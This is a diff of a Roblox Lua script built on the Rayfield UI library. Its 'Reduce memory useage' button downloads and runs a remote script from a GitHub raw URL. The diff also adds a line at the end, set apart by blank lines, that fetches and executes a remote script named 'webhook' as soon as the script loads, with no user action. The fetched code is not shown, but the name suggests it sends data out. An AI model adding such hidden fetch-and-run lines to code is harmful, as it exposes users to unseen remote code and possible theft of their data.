@@ -10,7 +10,7 @@ local Window = Rayfield:CreateWindow({
 
    ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
 
-   DisableRayfieldPrompts = true,
+   DisableRayfieldPrompts = false,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
@@ -157,11 +157,9 @@ local Button = Tab2:CreateButton({
 
 local Divider = Tab2:CreateDivider()
 
-local Toggle = Tab2:CreateToggle({
+local Button = Tab2:CreateButton({
    Name = "Reduce memory useage",
-   CurrentValue = false,
-   Flag = "e", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
+   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/reducelag'))()
    end,
 })
@@ -187,5 +185,8 @@ local Button = Tab1:CreateButton({
 
 
 Rayfield:LoadConfiguration()
+
+
+
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
